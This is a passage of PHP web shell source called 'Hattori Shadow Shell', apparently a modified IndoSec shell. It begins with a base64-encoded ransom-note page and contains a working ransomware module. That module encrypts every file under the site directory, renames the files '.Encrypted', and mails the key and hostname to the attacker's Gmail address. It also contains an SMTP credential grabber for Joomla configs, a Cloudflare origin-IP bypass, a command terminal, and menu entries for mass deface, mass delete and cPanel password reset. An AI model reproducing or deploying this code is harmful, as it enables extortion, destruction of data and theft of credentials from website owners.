IC5tZWdhIHsKICAgICAgICAgdGV4dC1zaGFkb3c6IDRweCAwIDhweCAjMDA3M0I5OwogICAgICAg
ICBmb250LXdlaWdodDogYm9sZGVyOwogICAgICAgICBmb250LWZhbWlseTogIkFyY2hpdGVjdHMg
RGF1Z2h0ZXIiOwogICAgICAgICB9CiAgICAgICAgIC53ZWFyZSB7CiAgICAgICAgIGZvbnQtZmFt
aWx5OiAiUGVybWFuZW50IE1hcmtlciI7CiAgICAgICAgIHRleHQtc2hhZG93OiAwIDAgM3B4IHJl
ZDsKICAgICAgICAgZm9udC1zaXplOiAxLjNlbTsKICAgICAgICAgfQogICAgICAgICAudGh1bWIg
ewogICAgICAgICB3aWR0aDogMTUwcHg7IAogICAgICAgICBoZWlnaHQ6IDE5MHB4OyAKICAgICAg
ICAgbWFyZ2luOiA3MHB4IGF1dG87CiAgICAgICAgIHBlcnNwZWN0aXZlOiAxMDAwcHg7CiAgICAg
ICAgIH0KICAgICAgICAgLnRodW1iIHNwYW4gewogICAgICAgICBkaXNwbGF5OiBibG9jazsgd2lk
dGg6IDEwMCU7IGhlaWdodDogMTAwJTsKICAgICAgICAgYmFja2dyb3VuZDogCiAgICAgICAgIGxp
bmVhci1ncmFkaWVudChyZ2JhKDAsIDAsIDAsIDAuNCksIHJnYmEoMCwgMCwgMCwgMC40KSksIHVy
bCgiaHR0cDovL3MyOS5wb3N0aW1nLm9yZy83cnUycTc2amIva2N3X2xvZ29fZGVmYWNlLnBuZyIp
OwogICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IDAsIGNvdmVyOwogICAgICAgICB0cmFuc2Zvcm0t
c3R5bGU6IHByZXNlcnZlLTNkOwogICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC41czsKICAgICAg
ICAgfQogICAgICAgICBociB7CgkJCSBib3gtc2hhZG93OiAzcHggM3B4IDNweCAzcHggIzg4ODg4
ODsKCQkJIGNvbG9yOiNmZmY7CgkJCSBtYXJnaW4tYm90dG9tOiAycHg7CgkJIH0KCQkgLmdyZWVl
dCB7CgkJCSBmb250LWZhbWlseTpBbGRyaWNoO2ZvbnQtd2VpZ2h0OmJvbGQ7Zm9udC1zaXplOjE3
cHg7CgkJIH0gCgkJIC5lbmhhbmNlIHsKCQkJIHBhZGRpbmc6IDFlbSAxZW07CgkJCSBiYWNrZ3Jv
dW5kOnVybCgnJyk7CgkJIH0KCQkgLm5vcCB7CgkJCSBiYWNrZ3JvdW5kOiByZ2JhKDMyLCAzMiwg
MzIsIC40KTsKICAgICAgICAgICAgICAgICAgICAgICAgIHBhZGRpbmc6IDhweCA4cHg7CgkJIH0g
CgkJIC5pcGtleSB7CgkJCSB3aWR0aDogMjAlOwogICAgICAgICAgICAgdHJhbnNpdGlvbjogd2lk
dGggMXM7CiAgICAgICAgICAgICAtd2Via2l0LXRyYW5zaXRpb246IHdpZHRoIDFzOwogICAgICAg
ICAgICAgLW1vei10cmFuc2l0aW9uOiB3aWR0aCAxczsKICAgICAgICAgICAgIGhlaWdodDogNDBw
eDsKICAgICAgICAgICAgIGZvbnQtZmFtaWx5Ok1vbnRzZXJyYXQ7Zm9udC13ZWlnaHQ6Ym9sZDtm
b250LXNpemU6MjVweDsKCQkgfQoJCSAuaXBrZXk6aG92ZXIgewoJCQkgd2lkdGg6IDMwJTsKCQkg
fQoJCSAuaXB0eHQgewoJCQkgd2lkdGg6IDUwJTsKCQkJIGhlaWdodDogNDBweDsKCQkJIGZvbnQt
ZmFtaWx5Ok1vbnRzZXJyYXQ7Zm9udC13ZWlnaHQ6Ym9sZDtmb250LXNpemU6MTVweDsKCQkgfQoJ
CSAuYnV0dG9uIHsKCQkJIGJhY2tncm91bmQ6ICM2NjY7CgkJCSBib3JkZXI6IDFweCBzb2xpZCAj
ZmZmOwoJCQkgaGVpZ2h0OiA0MHB4OwoJCQkgZm9udC1zaXplOiAyMHB4OwoJCQkgYm9yZGVyLXJh
ZGl1czogNXB4IDVweCA1cHggNXB4OwoJCQkgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsKCQkJ
IGNvbG9yOiAjZmZmOwoJCSB9CgkJIC5idXR0b246aG92ZXIgewoJCQkgYmFja2dyb3VuZDogIzAw
MDsKCQkgfQogICAgICA8L3N0eWxlPgogICA8L2hlYWQ+CiAgIAogICA8Ym9keT4KICAgICAgPGVt
YmVkIHNyYz0iaHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3MvbW53OTFxYW9iNTBv
enZsL3dlJTIwYXJlJTIwYW5vbnltb3VzLm1wMz9kbD0wIiB3aWR0aD0iMCIgaGVpZ2h0PSIwIiAv
PgogICAgICA8Y2VudGVyPgoJCSAgCiAgICAgICAgIDwhLS0gd2hvIHdlIGFyZT8gLS0+CiAgICAg
ICAgIDxkaXYgaWQ9ImhlYWRlciI+CgkJICAgPHNwYW4gY2xhc3M9Imdsb3ciIHN0eWxlPSJmb250
LXNpemU6IDMwcHQ7Ij7igKo8aSBjbGFzcz0iZmEgZmEtaGFuZC1vLXJpZ2h0IiBhcmlhLWhpZGRl
bj0idHJ1ZSI+PC9pPiBQaC5NaWtleSA8aSBjbGFzcz0iZmEgZmEtaGFuZC1vLWxlZnQiIGFyaWEt
aGlkZGVuPSJ0cnVlIj48L2k+PC9zcGFuPjxici8+CgkJICAgCQkgIAogICAgICAgICAgIDxkaXYg
Y2xhc3M9ImFuaW1hdGVkIGZsaXAiPjxzcGFuIGNsYXNzPSJibHVlZ2xvdyBjYXBzIj48Zm9udCBz
aXplPSI1Ij48aSBjbGFzcz0iZmEgZmEtcmF2ZWxyeSIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4g
IENPTlRBQ1QgVVMgVE8gR0VUIFRIRSBLRVkgIDxpIGNsYXNzPSJmYSBmYS1yYXZlbHJ5IiBhcmlh
LWhpZGRlbj0idHJ1ZSI+PC9pPjwvZm9udD48L3NwYW4+PC9kaXY+CiAgICAgICAgIDwvZGl2Pgog
ICAgICAgICA8IS0tIEJQQyBMb2dvIC0tPiAKICAgICAgICAgPGRpdiBjbGFzcz0idGh1bWIga2N3
aW1nIj4KICAgICAgICAgICAgPHNwYW4+PC9zcGFuPgogICAgICAgICA8L2Rpdj4KICAgICAgCiAg
ICAgICAgIDwhLS1lbmNyeXB0IG1zZyAtLT4KICAgICAgICAgPGRpdiBjbGFzcz0iYW5pbWF0ZWQg
aW5maW5pdGUgZmxhc2giPjxzcGFuIGNsYXNzPSJnciIgc3R5bGU9J2NvbG9yOmJsYWNrOyBmb250
LWZhbWlseTogIkx1Y2tpZXN0IEd1eSInPjxmb250IHNpemU9IjUiPjxpIGNsYXNzPSJmYSBmYS1s
b2NrIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiBZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBU
RUQgPGkgY2xhc3M9ImZhIGZhLWxvY2siIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+PC9mb250Pjwv
c3Bhbj48L2Rpdj4KICAgICAgICAgPGJyPgogICAgICAgICA8IS0tIGtleSAtLT4KICAgICAgICAg
PGRpdiBjbGFzcz0ibm9wIj4KICAgICAgICAgPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+
CiAgICAgICAgIDxwPjxpIGNsYXNzPSJmYSBmYS1oYW5kLW8tZG93biIgYXJpYS1oaWRkZW49InRy
dWUiPjwvaT4gRU5URVIgVEhFIEtFWSBUTyBERUNSWVBUIEZJTEVTIDxpIGNsYXNzPSJmYSBmYS11
bmxvY2siIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+PC9wPgogICAgICAgICA8aW5wdXQgdHlwZT0i
dGV4dCIgY2xhc3M9Imlwa2V5IiBuYW1lPSJpb2tleSIgLz4KICAgICAgICAgPC9mb3JtPgogICAg
ICAgICA8L2Rpdj4gICAgICAgICA8IS0tIEk0TSAtLT4KICAgICAgICAgPGgxIHN0eWxlPSdmb250
LWZhbWlseTogIkNoZXJyeSBDcmVhbSBTb2RhIjsnPjxiPuKclzxzcGFuIGNsYXNzPSJtZWdhIj5I
JCRfUkAkME0zVzNSPC9zcGFuPuKclzwvYj48L2gxPgogICAgICAgICA8YnI+CiAgICAgICAgIDxi
cj4KICAgICAgICAgPGJyPgogICAgICAgICA8YnI+CiAgICAgICAgIDxicj4KICAgICAgICAgPGJy
PgogICAgICAgICAKCiAgICAgICAgIDwhLS0gd2FybmluZyAtLT4KICAgICAgICAgICA8ZGl2IGNs
YXNzPSJ3ZWFyZSI+V2Ugd2FudGVkIHRvIHJlcG9ydCBpdCBhcyBhIFZ1bG5lcmFiaWx0eSBidXQg
c29tZXRpbWVzIG11Y2ggZWFzaWVyIGlmIHlvdSA8YSBocmVmPSJtYWlsdG86YW50aWJ1bGx5MDkx
MjNAZ21haWwuY29tIj5Db250YWN0IFVzPC9hPjxiPjxpPjwvaT48L2I+PC9kaXY+CiAgICAgICAg
ICAgPGJyPgogICA8L2JvZHk+CjwvaHRtbD4=
"))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  index.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htaFuck") ){
        if( unlink(".htaccess") && unlink("index.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> index.php (Default Page)<br>';
        }
        rename(".htaFuck", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"ransmini.php")  && deRanSomeware::kecuali($locate,".pnjg")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"index.php") &&  deRanSomeware::kecuali($locate,"indehx.php") && deRanSomeware::kecuali($locate,".htalol") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

   public function report($key){
        $message.= "=========    Report Ransomeware    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= Ransomware =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Report <ransomware@info.com>\r\n";
        mail("antibully09123@gmail.com",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".Encrypted");
        break;
        case '2':
          $locates = str_replace(".Encrypted", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Encrypted</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Encrypted</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Decrypted</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Decrypted</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}}else {
?>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="Password Key">
      <select name="method" class="selecte">
         <option value="1">Locked</option>
         <option value="2">Unlocked</option>
      </select>
      <input type="hidden" name="submit" value="submit"/>
      <input type="submit" name="runransom" class="submite" value="Run" />
</form>
<?php
}}
function scj($dir){
	$dirs = scandir($dir);
	foreach($dirs as $dirb){
		if(!is_file("$dir/$dirb")) continue;
		$ambil = file_get_contents("$dir/$dirb");
		$ambil = str_replace("$", "", $ambil);
		if(preg_match("/JConfig|joomla/", $ambil)){
			$smtp_host = ambilkata($ambil,"smtphost = '","'");
			$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
			$smtp_user = ambilkata($ambil,"smtpuser = '","'");
			$smtp_pass = ambilkata($ambil,"smtppass = '","'");
			$smtp_port = ambilkata($ambil,"smtpport = '","'");
			$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
			echo "<table class='text-white table table-bordered'>
				<tr>
					<td>SMTP Host: $smtp_host</td>
				</tr>
				<tr>
					<td>SMTP Port: $smtp_port</td>
				</tr>
				<tr>
					<td>SMTP User: $smtp_user</td>
				</tr>
				<tr>
					<td>SMTP Pass: $smtp_pass</td>
				</tr>
				<tr>
					<td>SMTP Auth: $smtp_auth</td>
				</tr>
				<tr>
					<td>SMTP Secure: $smtp_secure</td>
				</tr>
			</table>";
		}
	}
	echo "<p class='text-muted'>NB : Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/namafolder_config )</p>";
	exit;
}
function bypasscf(){
	echo '<form method="POST">
		<h5 class="text-center mb-3">Bypass Cloud Flare</h5>
		<div class="form-group input-group">
			<select class="form-control" name="idsPilih">
				<option>Pilih Metode</option>
				<option>ftp</option>
				<option>direct-conntect</option>
				<option>webmail</option>
				<option>cpanel</option>
			</select>
		</div>
		<div class="form-group input-group mb-4">
			<input class="form-control" type="text" name="target" placeholder="Input Url">
			<input class="btn btn-danger form-control" type="submit" value="Bypass">
		</div>
	</form>';
	$target = $_POST['target'];
	if($_POST['idsPilih'] == "ftp"){
		$ftp = gethostbyname("ftp."."$target");
		echo "<p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
		ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$ftp</font></p>";
	}
	if($_POST['idsPilih'] == "direct-conntect"){
		$direct = gethostbyname("direct-connect."."$target");
		echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
		ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$direct</font></p>";
	}
	if($_POST['idsPilih'] == "webmail"){
		$web = gethostbyname("webmail."."$target");
		echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
		ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$web</font></p>";
	}
	if($_POST['idsPilih'] == "cpanel"){
		$cpanel = gethostbyname("cpanel."."$target");
		echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
		ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$cpanel</font></p>";
	}
	exit;
}
function zipMenu($dir,$file){
	//Compress/Zip
	$exzip = basename($dir).'.zip';
	function Zip($source, $destination){
		if (extension_loaded('zip') === true){
			if (file_exists($source) === true){
				$zip = new ZipArchive();
				if ($zip->open($destination, ZIPARCHIVE::CREATE) === true){
					$source = realpath($source);
					if (is_dir($source) === true){
						$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
						foreach ($files as $file){
							$file = realpath($file);
							if (is_dir($file) === true){
								// $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
							}elseif(is_file($file) === true){
								$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
							}
						}
					}elseif(is_file($source) === true){
						$zip->addFromString(basename($source), file_get_contents($source));
					}
				}
				return @$zip->close();
			}
		}
		return false;
	}
	//Extract/Unzip
	function Zip_Extrack($zip_files, $to_dir){
		$zip = new ZipArchive();
		$res = $zip->open($zip_files);
		if ($res === TRUE){
			$name = basename($zip_files, ".zip")."_unzip";
			@mkdir($name);
			@$zip->extractTo($to_dir."/".$name);  
			return @$zip->close();
		}else{
			return false;
		}
	}
	echo '<div class="card card-body text-dark mb-4">
		<h4 class="text-center">Zip Menu</h3>
		<form enctype="multipart/form-data" method="post">
			<div class="form-group">
				<label>Zip File:</label>
				<div class="custom-file">
					<input type="file" name="zip_file" class="custom-file-input" id="customFile">
					<label class="custom-file-label" for="customFile">Choose file</label>
				</div>
				<input type="submit" name="upnun" class="btn btn-danger btn-block mt-3" value="Upload & Unzip"/>
			</div>
		</form>';
		if($_POST["upnun"]){
			$filename = $_FILES["zip_file"]["name"];
			$tmp = $_FILES["zip_file"]["tmp_name"];
			if(move_uploaded_file($tmp, "$dir/$filename")){
				echo Zip_Extrack($filename, $dir);
				unlink($filename);
				$swa = "success";
				$text = "Extract Successfully Zip";
				swall($swa,$text,$dir);
			}else{
				echo "<b>Failed to Extract!</b>";
			}
		}
		echo "<div class='row'><div class='col-md-6 mb-3'><h5>Zip Backup</h5>
		<form method='post'>
			<label>Folder</label>
			<input type='text' name='folder' class='form-control mb-3' value='$dir'>
			<input type='submit' name='backup' class='btn btn-danger btn-block' value='Backup!'>
		</form>";
		if($_POST['backup']){
			$fol = $_POST['folder'];
			if(Zip($fol, $_POST["folder"].'/'.$exzip)){
				$swa = "success";
				$text = "Extract Successfully Zip";
				swall($swa,$text,$dir);
			}else{
				echo "<b>Failed to Extract!</b>";
			}
		}
		echo "</div>
		<div class='col-md-6'><h5>Unzip Manual</h5>
		<form action='' method='post'>
			<label>Zip Location:</label>
			<input type='text' name='file_zip' class='form-control mb-3' value='$dir/$exzip'>
			<input type='submit' name='extrak' class='btn btn-danger btn-block' value='Unzip!'>
		</form>";
		if($_POST['extrak']){
			$zip = $_POST["file_zip"];
			if (Zip_Extrack($zip, $dir)){
				$swa = "success";
				$text = "Extract Successfully Zip";
				swall($swa,$text,$dir);
			}else{
				echo "<b>Failed to Extract!</b>";
			}
		}
	echo '</div></div></div>';
}
?>
<html>
	<head>
		<meta name="viewport" content="widht=device-widht, initial-scale=1"/>
		<meta name="theme-color" content="#343a40"/>
		<meta name="author" content="Holiq"/>
		<meta name="copyright" content="{ HSS }"/>
		<link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/HSS.png"/>
		<title>{ HSS sHell }</title>
		<link rel="stylesheet" href="pojan/assets/css/bootstrap.min.css">
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.2/css/all.min.css"/>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
		<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
		<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
		<script src="https://cdn.jsdelivr.net/npm/sweetalert2@8.18.0/dist/sweetalert2.all.min.js"></script>
	</head>
	<body class="bg-dark text-light">
		<script>
			$(document).ready(function(){
				$(window).scroll(function(){
					if ($(this).scrollTop() > 700){
						$(".scrollToTop").fadeIn();
					}else{
						$(".scrollToTop").fadeOut();
					}
				});
				$(".scrollToTop").click(function(){
					$("html, body").animate({scrollTop : 0},1000);
					return false;
				});
			});
			$(document).ready(function(){
				$('input[type="file"]').on("change", function(){
					let filenames = [];
					let files = document.getElementById("customFile").files;
					if (files.length > 1){
						filenames.push("Total Files (" + files.length + ")");
					}else{
						for (let i in files){
							if (files.hasOwnProperty(i)){
								filenames.push(files[i].name);
							}
						}
					}
					$(this).next(".custom-file-label").html(filenames.join(","));
				});
			});
			var max_fields = 5;
			var x = 1;
			$(document).on('click', '#add_input', function(e){
				if(x < max_fields){
					x++;
					$('#output').append('<div class=\"input-group\ form-group\ text-dark\" id=\"out\"><input type=\"text\" class=\"form-control\" name=\"nama_file[]\" placeholder=\"Nama File...\"><div class=\"input-group-prepend\ remove\"><div class=\"input-group-text\"><a href="#" class="text-dark"><i class=\"fa fa-minus\"></i></a></div></div></div>');
				}
				$('#output').on("click",".remove", function(e){
					e.preventDefault(); $(this).parent('#out').remove(); x--;
					repeat();
				})
			});
			$(document).on('click', '#add_input1', function(e){
				if(x < max_fields){
					x++;
					$('#output1').append('<div class=\"input-group\ form-group\ text-dark\" id=\"out\"><input type=\"text\" class=\"form-control\" name=\"nama_folder[]\" placeholder=\"Folder Name...\"><div class=\"input-group-prepend\ remove\"><div class=\"input-group-text\"><a href="#" class="text-dark"><i class=\"fa fa-minus\"></i></a></div></div></div>');
				}
				$('#output1').on("click",".remove", function(e){
					e.preventDefault(); $(this).parent('#out').remove(); x--;
					repeat();
				})
			});
			
		</script>
		<style>
			@import url(https://fonts.googleapis.com/css?family=Lato);
			@import url(https://fonts.googleapis.com/css?family=Quicksand);
			@import url(https://fonts.googleapis.com/css?family=Inconsolata);
			@media(min-width:767px){.scrollToTop{display:none !important;}}
			@media(max-width:767px){textarea{font-size:13px !important;}}
			input[type="text"],textarea {font-family: "Inconsolata", monospace;}
			body{margin:0;padding:0;font-family:"Lato";overscroll-behavior:none;}
			.infor{font-size:14px;color:#333!important;}
			.ds{color:#f00!important;word-wrap:break-word;}
			#tab table thead th{padding:5px;font-size:16px;white-space: nowrap;}
			#tab tr {border-bottom:1px solid #ccc;}
			#tab tr:hover{background:#5B6F7D;color:#fff;}
			#tab tr td{padding:5px 10px;white-space:nowrap;}
			.pinggir{text-align:left !important; padding-left: 4px !important;}
			#tab tr td .badge{font-size:13px;}
			.active,.active:hover{color:#00FF00;}
			a {font-family:"Quicksand"; color:white;}
			a:hover{color:dodgerBlue;}
			.badge{width:30px;transition:.3s;}
			.badge:hover{transform: scale(1.1);transition:.3s;}
			.ico {width:25px;}
			.ico2{width:30px;}
			.scrollToTop{
				position:fixed;
				bottom:30px;
				right:30px;
				width:35px;
				height:35px;
				background:#262626;
				color:#fff;
				border-radius:15%;
				text-align:center;
				opacity:.5;
			}
			.scrollToTop:hover{color:#fff;}
			.up{font-size:25px;line-height:35px;}
			.lain{color:#888888;font-size:20px;margin-left:5px;top:1px;}
			.lain:hover{color:#fff;}
			.tambah{
				width:35px;
				height:35px;
				line-height:35px;
				border:1px solid;
				border-radius:50%;
				text-align:center;
			}
			.fiture{margin:3px;}
			.tmp th {font-size:14px;}
			.tmp tr td{border:solid 1px #BBBBBB;text-align:center;font-size:13px;padding:2px 5px;}
			.tmp tr:hover{background:#5B6F7D; color:#fff;}
			.about{color:#000;}
			.about .card-body .img{
				position: relative;
				background: url(https://i.postimg.cc/Wb1X4xNS/image.png);
				background-size: cover;
				width: 150px;
				height: 150px;
			}
			.butn {
				position: relative;
				text-align: center;
				padding: 3px;
				background:rgba(225,225,225,.3);
				-webkit-transition: background 300ms ease, color 300ms ease;
				transition: background 300ms ease, color 300ms ease;
			}
			input[type="radio"].toggle {display:none;}
			input[type="radio"].toggle + label {cursor:pointer;margin:0 2px;width:60px;}
			input[type="radio"].toggle + label:after {
				position: absolute;
				content: "";
				top: 0;
				background: #fff;
				height: 100%;
				width: 100%;
				z-index: -1;
				-webkit-transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
				transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
			}
			input[type="radio"].toggle.toggle-left + label:after {left:100%;}
			input[type="radio"].toggle.toggle-right + label {margin-left:-5px;}
			input[type="radio"].toggle.toggle-right + label:after {left:-100%;}
			input[type="radio"].toggle:checked + label {cursor:default;color:#000;-webkit-transition:color 400ms;transition: color 400ms;}
			input[type="radio"].toggle:checked + label:after {left:0;}
		</style>
		<nav class="navbar static-top navbar-dark">
			<button class="navbar-toggler"type="button" data-toggle="collapse" data-target="#info" aria-label="Toggle navigation">
				<i style="color:#fff;" class="fa fa-navicon"></i>
			</button>
			<div class="collapse navbar-collapse" id="info">
				<ul>
					<!--- Not Used
					<a href="https://facebook.com/" class="lain"><i class="fa fa-facebook tambah"></i></a>
					<a href="https://www.instagram.com/" class="lain"><i class="fa fa-instagram tambah"></i></a>
					<a href="https://www.youtube.com/" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
					<a href="https://github.com/" class="lain"><i class="fa fa-github tambah"></i></a>
					<a href="https://website.com" class="lain"><i class="fa fa-globe tambah"></i></a> --->
				</ul>
			</div>
		</nav>
		<?php
		echo '<div class="container">
			<h1 class="text-center"><a href="" style="color:#ffffff;">Hattori Shadow Shell</h1>
			<center><h5>Modified Shell of IndoSec 2019</a></h5></center>
			<hr/>
			<div class="text-center">
				<div class="d-flex justify-content-center flex-wrap">
					<a href="?" class="fiture btn btn-danger btn-sm"><i class="fa fa-home"></i> Home</a>
					<a href="?dir='.$dir.'&tool=upload" class="fiture btn btn-danger btn-sm"><i class="fa fa-upload"></i> Upload</a>
					<a href="?dir='.$dir.'&tool=New_file" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus-circle"></i> New File</a>
					<a href="?dir='.$dir.'&tool=New_folder" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> New Folder</a>
					<a href="?dir='.$dir.'&tool=masdef" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Mass Deface</a>
					<a href="?dir='.$dir.'&tool=masdel" class="fiture btn btn-danger btn-sm"><i class="fa fa-trash"></i> Mass Delete</a>
					<a href="?dir='.$dir.'&tool=jumping" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Jumping</a>
					<a href="?dir='.$dir.'&tool=config" class="fiture btn btn-danger btn-sm"><i class="fa fa-cogs"></i> Config</a>
					<a href="?dir='.$dir.'&tool=adminer" class="fiture btn btn-danger btn-sm"><i class="fa fa-user"></i> Adminer</a>
					<a href="?dir='.$dir.'&tool=cgi" class="fiture btn btn-danger btn-sm"><i class="fa fa-user"></i> Cgi</a>
					<a href="?dir='.$dir.'&tool=symlink" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-circle"></i> Symlink</a>
					<a href="?dir='.$dir.'&tool=bctools" class="fiture btn btn-danger btn-sm"><i class="fas fa-network-wired"></i> Network</a>
					<a href="?dir='.$dir.'&tool=resetpasscp" class="fiture btn btn-warning btn-sm"><i class="fa fa-key"></i> Auto Reset Cpanel</a>
					<a href="?dir='.$dir.'&tool=auteduser" class="fiture btn btn-warning btn-sm"><i class="fas fa-user-edit"></i> Auto Edit User</a>
					<a href="?dir='.$dir.'&tool=ransom" class="fiture btn btn-warning btn-sm"><i class="fab fa-keycdn"></i> Ransomware</a>
					<a href="?dir='.$dir.'&tool=smtpgrab" class="fiture btn btn-warning btn-sm"><i class="fas fa fa-exclamation-circle"></i> SMTP Grabber</a>
					<a href="?dir='.$dir.'&tool=bypascf" class="fiture btn btn-warning btn-sm"><i class="fas fa-cloud"></i> Bypass Cloud Flare</a>
					<a href="?dir='.$dir.'&tool=zip_menu" class="fiture btn btn-warning btn-sm"><i class="fa fa-file-archive-o"></i> Zip Menu</a>
					<a href="?about" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> About Us</a>
					<a href="?logout" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> logout</a>
				</div>
			</div>
			<div class="row">
				<div class="col-md-5"><br/>
					<h5><i class="fa fa-terminal"></i>Terminal : </h5>
					<form>
						<input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | heked">
					</form>
					<hr/>
					<h5><i class="fa fa-search"></i> Information : </h5>
					<div class="card table-responsive">
						<div class="card-body">
							<table class="table infor">
								<tr>
									<td>PHP</td>
									<td> : '.$ver.'</td>
								</tr>
								<tr>
									<td>IP Server</td>
									<td> : '.$ip.'</td>
								</tr>
								<tr>
									<td>HDD</td>
									<td class="d-flex">Total : '.formatSize($total).' Free : '.formatSize($free).' ['.$pers.'%]</td>
								</tr>
								<tr>
									<td>Domain</td>
									<td>: '.$dom.'</td>
								</tr>
								<tr>
									<td>MySQL</td>
									<td>: '.$mysql.'</td>
								</tr>
								<tr>
									<td>cURL</td>
